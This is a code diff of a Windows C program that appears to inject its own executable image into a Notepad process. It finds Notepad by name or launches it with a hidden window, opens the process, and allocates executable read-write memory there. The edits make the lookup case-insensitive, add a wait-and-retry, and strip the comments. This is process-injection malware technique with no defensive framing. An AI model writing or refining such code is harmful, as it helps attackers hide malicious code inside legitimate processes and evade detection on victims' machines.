@@ -20,27 +20,22 @@ DWORD get_pid_by_name(const char *proc_name) {
     HANDLE hProcessSnap;
     DWORD pid = 0;
 
-    // Take a snapshot of all processes in the system.
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
         fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
         return 0;
     }
 
-    // Set the size of the structure before using it.
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
-    // Retrieve information about the first process,
-    // and exit if unsuccessful
     if (!Process32First(hProcessSnap, &pe32)) {
-        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError()); // Show cause of failure
-        CloseHandle(hProcessSnap);          // Clean the snapshot object
+        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError());
+        CloseHandle(hProcessSnap);
         return 0;
     }
 
-    // Now walk the snapshot of processes, and display information about each process in turn
     do {
-        if (strcmp(pe32.szExeFile, proc_name) == 0) {
+        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
             pid = pe32.th32ProcessID;
             break;
         }
@@ -50,40 +45,22 @@ DWORD get_pid_by_name(const char *proc_name) {
     return pid;
 }
 
-DWORD LaunchHiddenProcess(const char *processName) {
+void LaunchHiddenProcess(const char *processName) {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;  // Hide the window
+    si.wShowWindow = SW_HIDE;
 
     ZeroMemory(&pi, sizeof(pi));
 
-    // Start the child process
-    if (CreateProcess(NULL,       // No module name (use command line)
-                      (LPSTR)processName, // Command line
-                      NULL,       // Process handle not inheritable
-                      NULL,       // Thread handle not inheritable
-                      FALSE,      // Set handle inheritance to FALSE
-                      0,          // No creation flags
-                      NULL,       // Use parent's environment block
-                      NULL,       // Use parent's starting directory
-                      &si,        // Pointer to STARTUPINFO structure
-                      &pi)        // Pointer to PROCESS_INFORMATION structure
-    ) {
-        // Return the PID of the newly created process
-        DWORD pid = pi.dwProcessId;
-
-        // Close handles to avoid resource leaks
+    if (!CreateProcess(NULL, (LPSTR)processName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        fprintf(stderr, "CreateProcess failed, error: %lu\n", GetLastError());
+    } else {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
-
-        return pid;
-    } else {
-        // If process creation failed, return 0 or an appropriate error code
-        return 0;
     }
 }
 
@@ -98,17 +75,15 @@ int main()
 	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
 	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
 
-
     DWORD pid = get_pid_by_name("Notepad.exe");
-    if(pid == 0) {
-        pid = LaunchHiddenProcess("Notepad.exe");
-    }
 
-    if(pid == 0) {
-        printf("Cannot create Notepad process!");
-        scanf("%d", &x);
-        return 1;
+    if (pid == 0) {
+        LaunchHiddenProcess("Notepad.exe");
+        Sleep(5000);
+        pid = get_pid_by_name("Notepad.exe");
     }
+    if (pid == 0)
+        return 0;
 
 	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
 	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -156,4 +131,5 @@ int main()
 	VirtualFree(localImage, 0, MEM_RELEASE);
 
 	return 0;
+
 }
